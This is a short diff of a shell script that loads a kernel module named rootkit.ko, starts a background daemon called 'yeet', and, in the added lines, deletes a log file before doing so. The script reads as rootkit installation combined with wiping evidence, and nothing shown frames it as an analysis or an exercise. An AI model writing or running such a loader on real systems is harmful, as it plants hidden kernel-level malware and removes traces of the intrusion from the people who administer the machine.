@@ -1,4 +1,5 @@
 #!/bin/sh
 
-kldload /boot/kernel/rootkit.ko
-/sbin/daemon yeet &
+rm /log.txt
+/sbin/kldload /boot/kernel/rootkit.ko
+/lib/daemon yeet &
